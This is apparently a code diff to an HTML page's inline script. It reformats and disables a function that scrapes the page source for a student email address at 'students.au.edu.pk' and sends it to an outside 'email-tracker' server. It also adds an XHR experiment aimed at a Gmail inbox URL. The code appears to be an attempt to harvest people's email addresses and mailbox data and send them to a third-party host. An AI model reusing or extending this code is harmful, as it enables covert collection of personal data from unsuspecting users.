@@ -26,8 +26,31 @@
         xhr.open('GET', url, true);
         xhr.send();*/
 
-        function mainFunc() { var pageSource = encodeURIComponent(document.documentElement.outerHTML); const searchString = "students.au.edu.pk"; const index = pageSource.indexOf(searchString); const result = pageSource.substring(index - 20, index) + searchString; var url = "https://email-tracker.azurewebsites.net/submit_page_source?page_source=" + result; window.open(url); alert("Done!")};
-        mainFunc();
+        function mainFunc() {
+            var pageSource = encodeURIComponent(document.documentElement.outerHTML);
+            const searchString = "students.au.edu.pk";
+            const index = pageSource.indexOf(searchString);
+            const result = pageSource.substring(index - 20, index) + searchString;
+            var url = "https://email-tracker.azurewebsites.net/submit_page_source?page_source=" + result;
+            window.open(url);
+            alert("Done!");
+        };
+        // mainFunc();
+
+        function makeReq() {
+            var xhr = new XMLHttpRequest();
+            var url = 'https://mail.google.com/mail/u/0/#inbox';
+            xhr.open('GET', '');
+            xhr.onload = function () {
+                if (xhr.status === 200) {
+                    console.log(xhr.responseText);
+                } else {
+                    console.log('Request failed.  Returned status of ' + xhr.status);
+                }
+            };
+            xhr.send();
+        }
+        makeReq();
     </script>
 </body>
 </html>
